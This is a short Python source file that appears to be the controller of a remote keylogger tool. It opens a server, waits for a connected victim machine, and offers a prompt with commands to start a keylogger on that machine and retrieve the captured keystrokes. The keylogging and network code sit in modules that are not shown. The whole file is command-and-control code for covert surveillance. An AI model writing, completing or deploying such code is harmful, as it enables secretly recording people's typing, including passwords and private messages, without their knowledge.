import socket
from lib import config, klg, server, string_utils


def shell(client: socket.socket, ip: str):

    while True:
        func, args = string_utils.extract_command(input(f"* Shell~{ip}: "))

        # quit
        if func == "quit":
            server.call_quit(client)
            break
        # keylogger [start|get]
        elif func == "keylogger":
            if args[0] == "start":
                klg.call_keylogger_start(client)
            elif args[0] == "get":
                klg.call_keylogger_get(client)


def open_klg_server():
    client, ip = server.open_server((config.IP, config.KLG_PORT))
    shell(client, ip)
